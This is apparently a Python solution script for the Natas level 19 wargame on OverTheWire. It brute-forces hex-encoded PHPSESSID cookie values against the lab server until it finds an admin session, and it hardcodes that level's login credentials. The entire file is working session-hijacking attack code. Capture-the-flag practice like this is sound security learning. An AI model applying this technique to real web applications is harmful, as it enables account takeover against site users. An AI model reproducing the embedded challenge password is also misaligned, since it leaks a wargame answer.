#!/usr/bin/python

__author__ = "bt3"

import requests


def brute_force_password(AUTH, URL, PAYLOAD, MAXID):

    for i in range(MAXID):
        HEADER ={'Cookie':'PHPSESSID=' + (str(i) + '-admin').encode('hex')}
        r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
        print(i)

        if "You are an admin" in r.text:
            print(r.text)
            print(r.url)


if __name__ == '__main__':

    AUTH = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
    URL = 'http://natas19.natas.labs.overthewire.org/index.php?'

    PAYLOAD = ({'debug': '1', 'username': 'admin', 'password': 'pass'})
    MAXID = 640

    brute_force_password(AUTH, URL, PAYLOAD, MAXID)
















